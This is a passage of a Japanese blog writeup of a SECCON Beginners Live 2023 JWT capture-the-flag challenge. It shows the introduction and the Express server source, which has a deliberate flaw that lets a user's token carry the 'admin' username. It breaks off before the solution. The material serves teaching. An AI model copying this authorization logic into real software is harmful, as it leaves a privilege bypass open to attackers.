<!doctype html><html><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>SECCON Beginners Live 2023 「JWTセキュリティ入門」 チャレンジ問題 writeup - yuasa's blog</title><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="はじめに 2023年9月3日に開催されたSECCON Beginners Live 2023にて、「JWTセキュリティ入門」というタイトルでLT発表を行いました。
SECCON Beginners Live 2023「JWTセキュリティ入門」の資料です#seccon #ctf4bhttps://t.co/wwIxuxCTpX
&mdash; JJ (yuasa) (@melonattacker) September 3, 2023 その際に出題したチャレンジ問題についての解法をまとめます。
JWTチャレンジの問題サーバはこちらですhttps://t.co/thiKxbpcyH
問題のソースコードはこちらから閲覧できますhttps://t.co/EYpv6bANE4
&mdash; JJ (yuasa) (@melonattacker) September 3, 2023 問題 問題のソースコードはこちらです。
const express = require(&#34;express&#34;); const jwt = require(&#34;jsonwebtoken&#34;); const crypto = require(&#34;crypto&#34;); const PORT = 5504; const FLAG = &#34;flag{this_is_trial3_flag}&#34;; const app = express(); app.use(express.json()); // シークレットキーを生成 const secret = crypto.randomBytes(16).toString(&#34;hex&#34;); // 初期ユーザーを設定 const users = [ { id: &#34;admin&#34;, username: &#34;admin&#34;, password: crypto."><meta property="og:image" content><meta property="og:title" content="SECCON Beginners Live 2023 「JWTセキュリティ入門」 チャレンジ問題 writeup"><meta property="og:description" content="はじめに 2023年9月3日に開催されたSECCON Beginners Live 2023にて、「JWTセキュリティ入門」というタイトルでLT発表を行いました。
SECCON Beginners Live 2023「JWTセキュリティ入門」の資料です#seccon #ctf4bhttps://t.co/wwIxuxCTpX
&mdash; JJ (yuasa) (@melonattacker) September 3, 2023 その際に出題したチャレンジ問題についての解法をまとめます。
JWTチャレンジの問題サーバはこちらですhttps://t.co/thiKxbpcyH
問題のソースコードはこちらから閲覧できますhttps://t.co/EYpv6bANE4
&mdash; JJ (yuasa) (@melonattacker) September 3, 2023 問題 問題のソースコードはこちらです。
const express = require(&#34;express&#34;); const jwt = require(&#34;jsonwebtoken&#34;); const crypto = require(&#34;crypto&#34;); const PORT = 5504; const FLAG = &#34;flag{this_is_trial3_flag}&#34;; const app = express(); app.use(express.json()); // シークレットキーを生成 const secret = crypto.randomBytes(16).toString(&#34;hex&#34;); // 初期ユーザーを設定 const users = [ { id: &#34;admin&#34;, username: &#34;admin&#34;, password: crypto."><meta property="og:type" content="article"><meta property="og:url" content="/posts/41/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-09-26T22:39:19+09:00"><meta property="article:modified_time" content="2023-09-26T22:39:19+09:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="SECCON Beginners Live 2023 「JWTセキュリティ入門」 チャレンジ問題 writeup"><meta name=twitter:description content="はじめに 2023年9月3日に開催されたSECCON Beginners Live 2023にて、「JWTセキュリティ入門」というタイトルでLT発表を行いました。
SECCON Beginners Live 2023「JWTセキュリティ入門」の資料です#seccon #ctf4bhttps://t.co/wwIxuxCTpX
&mdash; JJ (yuasa) (@melonattacker) September 3, 2023 その際に出題したチャレンジ問題についての解法をまとめます。
JWTチャレンジの問題サーバはこちらですhttps://t.co/thiKxbpcyH
問題のソースコードはこちらから閲覧できますhttps://t.co/EYpv6bANE4
&mdash; JJ (yuasa) (@melonattacker) September 3, 2023 問題 問題のソースコードはこちらです。
const express = require(&#34;express&#34;); const jwt = require(&#34;jsonwebtoken&#34;); const crypto = require(&#34;crypto&#34;); const PORT = 5504; const FLAG = &#34;flag{this_is_trial3_flag}&#34;; const app = express(); app.use(express.json()); // シークレットキーを生成 const secret = crypto.randomBytes(16).toString(&#34;hex&#34;); // 初期ユーザーを設定 const users = [ { id: &#34;admin&#34;, username: &#34;admin&#34;, password: crypto."><script src=/js/feather.min.js></script>
<link href=/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=/css/main.ac08a4c9714baa859217f92f051deb58df2938ec352b506df655005dcaf98cc0.css><link id=darkModeStyle rel=stylesheet type=text/css href=/css/dark.726cd11ca6eb7c4f7d48eb420354f814e5c1b94281aaf8fd0511c1319f7f78a4.css media="(prefers-color-scheme: dark)"><link rel=icon type=image/png href=/images/favicon.ico></head><body><div class=content><header><div class=main><a href=/>yuasa's blog</a></div><nav><a href=/>Home</a>
<a href=/posts>Posts</a>
<a href=/tags>Tags</a></nav></header><main><article><div class=title><h1 class=title>SECCON Beginners Live 2023 「JWTセキュリティ入門」 チャレンジ問題 writeup</h1><div class=meta>Posted on Sep 26, 2023</div></div><nav id=TableOfContents><ol><li><a href=#はじめに>はじめに</a></li><li><a href=#問題>問題</a></li><li><a href=#解法>解法</a></li><li><a href=#おわりに>おわりに</a></li></ol></nav><section class=body><h1 id=はじめに>はじめに</h1><p>2023年9月3日に開催された<a href=https://connpass.com/event/290912/>SECCON Beginners Live 2023</a>にて、「JWTセキュリティ入門」というタイトルでLT発表を行いました。</p><blockquote class=twitter-tweet><p lang=ja dir=ltr>SECCON Beginners Live 2023「JWTセキュリティ入門」の資料です<a href="https://twitter.com/hashtag/seccon?src=hash&ref_src=twsrc%5Etfw">#seccon</a> <a href="https://twitter.com/hashtag/ctf4b?src=hash&ref_src=twsrc%5Etfw">#ctf4b</a><a href=https://t.co/wwIxuxCTpX>https://t.co/wwIxuxCTpX</a></p>&mdash; JJ (yuasa) (@melonattacker) <a href="https://twitter.com/melonattacker/status/1698203236484948388?ref_src=twsrc%5Etfw">September 3, 2023</a></blockquote><script async src=https://platform.twitter.com/widgets.js></script><p>その際に出題したチャレンジ問題についての解法をまとめます。</p><blockquote class=twitter-tweet><p lang=ja dir=ltr>JWTチャレンジの問題サーバはこちらです<a href=https://t.co/thiKxbpcyH>https://t.co/thiKxbpcyH</a><br><br>問題のソースコードはこちらから閲覧できます<a href=https://t.co/EYpv6bANE4>https://t.co/EYpv6bANE4</a></p>&mdash; JJ (yuasa) (@melonattacker) <a href="https://twitter.com/melonattacker/status/1698203240343715921?ref_src=twsrc%5Etfw">September 3, 2023</a></blockquote><script async src=https://platform.twitter.com/widgets.js></script><h1 id=問題>問題</h1><p>問題のソースコードは<a href=https://github.com/SECCON/2023_beginnerslive/blob/main/yuasa/trial3/index.js>こちら</a>です。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.js data-lang=:.js><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>express</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>require</span>(<span style=color:#e6db74>&#34;express&#34;</span>);
</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>jwt</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>require</span>(<span style=color:#e6db74>&#34;jsonwebtoken&#34;</span>);
</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>crypto</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>require</span>(<span style=color:#e6db74>&#34;crypto&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>PORT</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>5504</span>;
</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>FLAG</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;flag{this_is_trial3_flag}&#34;</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>app</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>express</span>();
</span></span><span style=display:flex><span><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>use</span>(<span style=color:#a6e22e>express</span>.<span style=color:#a6e22e>json</span>());
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// シークレットキーを生成
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>secret</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>crypto</span>.<span style=color:#a6e22e>randomBytes</span>(<span style=color:#ae81ff>16</span>).<span style=color:#a6e22e>toString</span>(<span style=color:#e6db74>&#34;hex&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// 初期ユーザーを設定
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>users</span> <span style=color:#f92672>=</span> [
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>id</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;admin&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>username</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;admin&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>password</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>crypto</span>.<span style=color:#a6e22e>randomBytes</span>(<span style=color:#ae81ff>16</span>).<span style=color:#a6e22e>toString</span>(<span style=color:#e6db74>&#34;hex&#34;</span>),
</span></span><span style=display:flex><span>  },
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>id</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;guest&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>username</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;guest&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>password</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;guest&#34;</span>
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// ユーザーのプロパティが存在するか確認する関数
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>isUserPropertyExist</span>(<span style=color:#a6e22e>key</span>, <span style=color:#a6e22e>value</span>) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>users</span>.<span style=color:#a6e22e>some</span>(<span style=color:#a6e22e>user</span> =&gt; <span style=color:#a6e22e>user</span>[<span style=color:#a6e22e>key</span>] <span style=color:#f92672>===</span> <span style=color:#a6e22e>value</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#34;/&#34;</span>, (<span style=color:#a6e22e>req</span>, <span style=color:#a6e22e>res</span>) =&gt; {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>send</span>(<span style=color:#e6db74>&#34;Welcome to SECCON Beginners Live 2023 JWT Challenge!&#34;</span>);
</span></span><span style=display:flex><span>});
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// ユーザー登録エンドポイント
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>post</span>(<span style=color:#e6db74>&#34;/signup&#34;</span>, (<span style=color:#a6e22e>req</span>, <span style=color:#a6e22e>res</span>) =&gt; {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> { <span style=color:#a6e22e>id</span>, <span style=color:#a6e22e>username</span>, <span style=color:#a6e22e>password</span> } <span style=color:#f92672>=</span> <span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>body</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>id</span> <span style=color:#f92672>||</span> <span style=color:#f92672>!</span><span style=color:#a6e22e>username</span> <span style=color:#f92672>||</span> <span style=color:#f92672>!</span><span style=color:#a6e22e>password</span>) {
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>status</span>(<span style=color:#ae81ff>400</span>).<span style=color:#a6e22e>json</span>({ <span style=color:#a6e22e>error</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;Please send id, username and password&#34;</span> });
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>isUserPropertyExist</span>(<span style=color:#e6db74>&#39;username&#39;</span>, <span style=color:#a6e22e>username</span>)) {
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>status</span>(<span style=color:#ae81ff>400</span>).<span style=color:#a6e22e>json</span>({ <span style=color:#a6e22e>error</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;Username already exists&#34;</span> });
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>isUserPropertyExist</span>(<span style=color:#e6db74>&#39;id&#39;</span>, <span style=color:#a6e22e>id</span>)) {
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>status</span>(<span style=color:#ae81ff>400</span>).<span style=color:#a6e22e>json</span>({ <span style=color:#a6e22e>error</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;ID already exists&#34;</span> });
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>users</span>.<span style=color:#a6e22e>push</span>({
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>id</span>,
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>username</span>,
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>password</span>
</span></span><span style=display:flex><span>    });
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>json</span>({ <span style=color:#a6e22e>message</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;User registered successfully&#34;</span> });
</span></span><span style=display:flex><span>});
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// サインインエンドポイント
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>post</span>(<span style=color:#e6db74>&#34;/signin&#34;</span>, (<span style=color:#a6e22e>req</span>, <span style=color:#a6e22e>res</span>) =&gt; {
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>const</span> { <span style=color:#a6e22e>id</span>, <span style=color:#a6e22e>password</span> } <span style=color:#f92672>=</span> <span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>body</span>;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>id</span> <span style=color:#f92672>||</span> <span style=color:#f92672>!</span><span style=color:#a6e22e>password</span>) {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>status</span>(<span style=color:#ae81ff>400</span>).<span style=color:#a6e22e>json</span>({ <span style=color:#a6e22e>error</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;Please send username and password&#34;</span> });
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span>;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>user</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>users</span>.<span style=color:#a6e22e>find</span>(<span style=color:#a6e22e>u</span> =&gt; <span style=color:#a6e22e>u</span>.<span style=color:#a6e22e>id</span> <span style=color:#f92672>===</span> <span style=color:#a6e22e>id</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>u</span>.<span style=color:#a6e22e>password</span> <span style=color:#f92672>===</span> <span style=color:#a6e22e>password</span>);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>user</span>) {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>status</span>(<span style=color:#ae81ff>401</span>).<span style=color:#a6e22e>json</span>({ <span style=color:#a6e22e>error</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;Invalid id or password&#34;</span> });
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span>;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>signed</span>;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>try</span> {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>signed</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>jwt</span>.<span style=color:#a6e22e>sign</span>({
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>id</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>user</span>.<span style=color:#a6e22e>id</span>,
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>username</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>user</span>.<span style=color:#a6e22e>username</span>,
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>solved</span><span style=color:#f92672>:</span> <span style=color:#66d9ef>false</span>
</span></span><span style=display:flex><span>    },
</span></span><span style=display:flex><span>      <span style=color:#a6e22e>secret</span>, 
</span></span><span style=display:flex><span>      { <span style=color:#a6e22e>algorithm</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;HS256&#34;</span>, <span style=color:#a6e22e>expiresIn</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;1h&#34;</span> } 
</span></span><span style=display:flex><span>    );
</span></span><span style=display:flex><span>  } <span style=color:#66d9ef>catch</span> (<span style=color:#a6e22e>err</span>) {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>status</span>(<span style=color:#ae81ff>500</span>).<span style=color:#a6e22e>json</span>({ <span style=color:#a6e22e>error</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;Internal server error&#34;</span> });
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span>;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#34;Authorization&#34;</span>, <span style=color:#a6e22e>signed</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>json</span>({ <span style=color:#a6e22e>message</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;ok&#34;</span> });
</span></span><span style=display:flex><span>});
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// ユーザー名更新エンドポイント
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>post</span>(<span style=color:#e6db74>&#34;/username/update&#34;</span>, (<span style=color:#a6e22e>req</span>, <span style=color:#a6e22e>res</span>) =&gt; {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> { <span style=color:#a6e22e>newUsername</span> } <span style=color:#f92672>=</span> <span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>body</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>token</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#34;Authorization&#34;</span>);
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>newUsername</span> <span style=color:#f92672>||</span> <span style=color:#f92672>!</span><span style=color:#a6e22e>token</span>) {
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>status</span>(<span style=color:#ae81ff>400</span>).<span style=color:#a6e22e>json</span>({ <span style=color:#a6e22e>error</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;Please send newUsername and provide JWT token&#34;</span> });
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>verified</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span> {
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>verified</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>jwt</span>.<span style=color:#a6e22e>verify</span>(<span style=color:#a6e22e>token</span>, <span style=color:#a6e22e>secret</span>, { <span style=color:#a6e22e>algorithms</span><span style=color:#f92672>:</span> [<span style=color:#e6db74>&#34;HS256&#34;</span>] });
</span></span><span style=display:flex><span>    } <span style=color:#66d9ef>catch</span> (<span style=color:#a6e22e>err</span>) {
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>status</span>(<span style=color:#ae81ff>401</span>).<span style=color:#a6e22e>json</span>({ <span style=color:#a6e22e>error</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;Invalid Token&#34;</span> });
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>currentId</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>verified</span>.<span style=color:#a6e22e>id</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>user</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>users</span>.<span style=color:#a6e22e>find</span>(<span style=color:#a6e22e>u</span> =&gt; <span style=color:#a6e22e>u</span>.<span style=color:#a6e22e>id</span> <span style=color:#f92672>===</span> <span style=color:#a6e22e>currentId</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>user</span>) {
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>status</span>(<span style=color:#ae81ff>404</span>).<span style=color:#a6e22e>json</span>({ <span style=color:#a6e22e>error</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;User not found&#34;</span> });
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>user</span>.<span style=color:#a6e22e>username</span> <span style=color:#f92672>===</span> <span style=color:#e6db74>&#34;admin&#34;</span>) {
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>status</span>(<span style=color:#ae81ff>403</span>).<span style=color:#a6e22e>json</span>({ <span style=color:#a6e22e>error</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;Admin user cannot change its username&#34;</span> });
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>user</span>.<span style=color:#a6e22e>username</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>newUsername</span>;
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>json</span>({ <span style=color:#a6e22e>message</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;Username updated successfully&#34;</span> });
</span></span><span style=display:flex><span>});
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// flag取得エンドポイント
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#34;/flag&#34;</span>, (<span style=color:#a6e22e>req</span>, <span style=color:#a6e22e>res</span>) =&gt; {
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#34;Authorization&#34;</span>)) {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>status</span>(<span style=color:#ae81ff>400</span>).<span style=color:#a6e22e>json</span>({ <span style=color:#a6e22e>error</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;No JWT Token&#34;</span> });
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span>;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>verified</span>;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>try</span> {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>verified</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>jwt</span>.<span style=color:#a6e22e>verify</span>(
</span></span><span style=display:flex><span>      <span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#34;Authorization&#34;</span>),
</span></span><span style=display:flex><span>      <span style=color:#a6e22e>secret</span>, 
</span></span><span style=display:flex><span>      { <span style=color:#a6e22e>algorithms</span><span style=color:#f92672>:</span> [<span style=color:#e6db74>&#34;HS256&#34;</span>] }
</span></span><span style=display:flex><span>    );
</span></span><span style=display:flex><span>  } <span style=color:#66d9ef>catch</span> (<span style=color:#a6e22e>err</span>) {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>status</span>(<span style=color:#ae81ff>401</span>).<span style=color:#a6e22e>json</span>({ <span style=color:#a6e22e>error</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;Invalid Token&#34;</span> });
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span>;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>verified</span>.<span style=color:#a6e22e>username</span> <span style=color:#f92672>===</span> <span style=color:#e6db74>&#34;admin&#34;</span>) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>newToken</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span> {
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>newToken</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>jwt</span>.<span style=color:#a6e22e>sign</span>({
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>id</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>verified</span>.<span style=color:#a6e22e>id</span>,
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>username</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>verified</span>.<span style=color:#a6e22e>username</span>,
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>solved</span><span style=color:#f92672>:</span> <span style=color:#66d9ef>true</span>
</span></span><span style=display:flex><span>        },
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>secret</span>,
</span></span><span style=display:flex><span>            { <span style=color:#a6e22e>algorithm</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;HS256&#34;</span>, <span style=color:#a6e22e>expiresIn</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;1h&#34;</span> }
</span></span><span style=display:flex><span>        );
</span></span><span style=display:flex><span>    } <span style=color:#66d9ef>catch</span> (<span style=color:#a6e22e>err</span>) {
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>status</span>(<span style=color:#ae81ff>500</span>).<span style=color:#a6e22e>json</span>({ <span style=color:#a6e22e>error</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;Internal server error&#34;</span> });
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#34;Authorization&#34;</span>, <span style=color:#a6e22e>newToken</span>);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>send</span>(<span style=color:#e6db74>`Congratulations! Here&#39;s your flag: </span><span style=color:#e6db74>${</span><span style=color:#a6e22e>FLAG</span><span style=color:#e6db74>}</span><span style=color:#e6db74>`</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span>;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>send</span>(<span style=color:#e6db74>&#34;No flag for you&#34;</span>);
</span></span><span style=display:flex><span>});
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// サーバーの起動
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>listen</span>(<span style=color:#a6e22e>PORT</span>, () =&gt; {
